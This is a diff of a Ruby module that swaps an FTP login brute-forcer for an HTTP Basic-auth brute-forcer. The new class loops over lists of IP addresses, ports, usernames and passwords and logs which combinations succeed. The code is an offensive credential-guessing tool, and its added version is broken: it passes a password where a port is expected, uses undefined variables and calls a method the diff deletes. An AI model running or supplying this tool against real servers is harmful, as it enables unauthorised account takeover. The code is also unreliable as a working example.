@@ -1,207 +1,88 @@
-require 'net/ftp'
+require 'net/http'
 
 module ViolentRuby
-	# The Ftp Brute Forcer class provides a simply way to 
-	# brute-force an FTP server's credentials. 
-	# @author Kent 'picat' Gruber
-	#
-	# @example Basic Usage
-	#   ftp = FtpBruteForcer.new
-	#   ftp.users     = "resources/ftp_users.txt"
-	#   ftp.passwords = "resources/ftp_passwords.txt"
-	#   ftp.ips       = "resources/ftp_ips.txt"
-	#   ftp.ports     = "resources/ftp_ports.txt"
-	#   # brue'm!
-	#   ftp.brute_force!
-	#   # => results
-	#
-	class FtpBruteForcer 
-		# @attr [String] users Path to file containing users.
-    attr_accessor :users
-    # @attr [String] passwords Path to file containing passwords.
+
+	class HTTPBruteForcer
+
+		attr_accessor :users
 		attr_accessor :passwords
-    # @attr [String] ips Path to file containing ip addresses.
 		attr_accessor :ips
-    # @attr [String] ports Path to file containing ports.
 		attr_accessor :ports
 
-		# Create a new Ftp Brute Forcer.
-		#
-		# @param [Hash] args The options to create a new Ftp Brute Forcer.
-		# @param args [String] :users The path to a file of users to attempt.
-		# @param args [String] :passwords The path to a file of passwords to attempt.
-		# @param args [String] :ips The path to a file of server ips to attempt to connect to.
-		# @param args [String] :ports The path to a file of service ports to attempt to connect to.
 		def initialize(args = {})
-			@users     = args[:users]     if args[:users]     && File.readable?(args[:users]) 
-			@passwords = args[:passwords] if args[:passwords] && File.readable?(args[:passwords])
-			@ips       = args[:ips]       if args[:ips]       && File.readable?(args[:ips])
-			@ports     = args[:ports]     if args[:ports]     && File.readable?(args[:ports])
-			@ftp       = Net::FTP.new
+			self.users = process_args(args[:users])
+			self.passwords = process_args(args[:passwords])
+			self.ips = process_args(args[:ips])
+			self.ports = process_args(args[:ports])
 		end
 
-		# Brute force some'a dem FTP login credz.
-		#
-		# @param [Hash] args The options to brute force. 
-		# @param args [String] :users The path to a file of users to attempt.
-		# @param args [String] :passwords The path to a file of passwords to attempt.
-		# @param args [String] :ips The path to a file of server ips to attempt to connect to.
-		# @param args [String] :ports The path to a file of service ports to attempt to connect to.
-		def brute_force(args = {})
-			meets_our_requirements?(args) 
-			results   = []
-			ips       = args[:ips]        || @ips 
-			ports     = args[:ports]      || @ports
-			users     = args[:users]      || @users
-			passwords = args[:passwords]  || @passwords
-			iterate_over(ips).each do |ip|
-				iterate_over(ports).each do |port|
-					next unless connectable?(ip: ip, port: port)
-					iterate_over(users).each do |user|
-						iterate_over(passwords).each do |password|
-							if able_to_login?(ip: ip, port: port, username: user, password: password)
-								result = format_result("SUCCESS", ip, port, user, password)
-							else
-								result = format_result("FAILURE", ip, port, user, password)
+		def brute_force
+			results = []
+			self.users = file_to_array(self.users)
+			self.passwords = file_to_array(self.passwords)
+			self.ports = file_to_array(self.ports)
+			self.ips = file_to_array(self.ips)
+			meets_our_requirements?(ips: self.ips, ports: self.ports, usernames: self.usernames, passwords: self.passwords)
+			self.ips.each do |ip|
+				self.ports.each do |port|
+					self.users.each do |user|
+						self.passwords.each do |password|
+							if connectable?(ip, password) 
+								if able_to_login?(ip: ip, password: password, user: user, port: port)
+									result = format_result("SUCCESS", ip, port, user, password)
+								else
+									result = format_result("FAILURE", ip, port, user, password)
+								end
+								results << result
+								yield result if block_given?
 							end
-							results << result
-							yield result if block_given?
 						end
 					end
 				end
 			end
 			results
 		end
-
-		# brute_force! is the same as brute_force
-		alias brute_force! brute_force
-
-		# Check if a given IP address and port can connceted to.
-		# @see #brute_force
-		# @param [Hash] args the options to brute force. 
-		# @param args [String] :ip The ip address to attempt to connect to.
-		# @param args [String] :port The port to attempt to connect to.
-		# @return [Boolean]
-		def connectable?(args = {})
-			@ftp.connect(args[:ip], args[:port])
-			return true if @ftp.last_response_code == "220"
-			false
-		rescue
-			false
-		end
-
-		# Check if a given IP address, port, username and passwords 
-		# are correct to login.
-		# @see #brute_force
-		# @param [Hash] args 
-		# @param args [String] :ip 
-		# @param args [String] :port 
-		# @param args [String] :username
-		# @param args [String] :password
-		# @return [Boolean]
-		def able_to_login?(args = {})
-			@ftp.connect(args[:ip], args[:port])
-			@ftp.login(args[:username], args[:password])
-			# Can be: 230 logged in OR 230 Welcome to blah OR ... 
-			if @ftp.welcome.split(" ")[0] == "230"
-				@ftp.close
+		
+		def connectable?(ip, port)
+			begin
+				http = Net::HTTP.new(ip, port)
+				req = Net::HTTP::Get.new("/")
+				http.request(req)
 				return true
+			rescue
+				return false
 			end
-			@ftp.quit
-			false
-		rescue
-			false
 		end
 
+		def able_to_login?(args = {})
+			http = Net::HTTP.new(ip, port)
+			req = Net::HTTP::Get.new("/")
+			req.basic_auth(args[:user], args[:password])
+			http.request(req).code == "200"
+		end
+
+		alias brute_force! brute_force
 
 		private
 
-		# @api private
-		# Format the results from brute force attempts.
-		# @see #brute_force
-		# @param [String] type 
-		# @param [String] ip
-		# @param [Integer] port
-		# @param [String] user 
-		# @param [String] password 
-		# @return [Hash]
+		def process_args(arg)
+			if arg.is_a? Array or arg.is_a? NilClass
+				return arg
+			else
+				file_to_array(arg)
+			end
+		end
+		
+		def file_to_array(arg)
+			raise ArgumentError, "Arg must be a file" unless File.file? arg
+			File.read(arg).split("\n").map(&:strip)
+		end
+
 		def format_result(type, ip, port, user, password)
 			{ time: Time.now, type: type, ip: ip, port: port, user: user, password: password }
 		end
 
-		# @api private
-		# Iterate over each line in a file, stripping each line as it goes.
-		# @see File
-		# @param [String] file 
-		# @return [Enumerator]
-		def iterate_over(file)
-			File.foreach(file).map(&:strip)
-		end
-
-		# @api private
-		# Check if the given arguments contain an ip, port, password and user files.
-		# @see #brute_force
-		# @param [Hash] args the options to brute force. 
-		# @param args [String] :ips
-		# @param args [String] :ports
-		# @param args [String] :passwords
-		# @param args [String] :users
-		# @return [Boolean]
-		def meets_our_requirements?(args = {})
-			raise "No ip addresses to connect to." unless ips?(args)
-			raise "No ports to connect to." 			 unless ports?(args)
-			raise "No passwords to try." 					 unless passwords?(args)
-			raise "No users to try." 							 unless users?(args)
-			true
-		end
-
-		# @api private
-		# Check if the given arguments contains ips, or has been set.
-		# @see #meets_our_requirements?
-		# @param [Hash] args the options to brute force. 
-		# @param args [String] :ips
-		# @return [Boolean]
-		def ips?(args = {})
-			return true if args[:ips] || @ips
-			false 
-		end
-
-		# @api private
-		# Check if the given arguments contains passwords, or has been set.
-		# @see #meets_our_requirements?
-		# @param [Hash] args 
-		# @param args [String] :passwords
-		# @return [Boolean]
-		def passwords?(args = {})
-			return true if args[:passwords] || @passwords
-			false
-		end
-		def passwords?(args = {})
-			return true if args[:passwords] || @passwords
-			false
-		end
-
-		# @api private
-		# Check if the given arguments contains ports, or has been set.
-		# @see #meets_our_requirements?
-		# @param [Hash] args 
-		# @param args [String] :ports
-		# @return [Boolean]
-		def ports?(args = {})
-			return true if args[:ports] || @ports
-			false
-		end
-
-		# @api private
-		# Check if the given arguments contains users, or has been set.
-		# @see #meets_our_requirements?
-		# @param [Hash] args 
-		# @param args [String] :users
-		# @return [Boolean]
-		def users?(args = {})
-			return true if args[:users] || @users
-			false
-		end
-
 	end
 end
+
+				
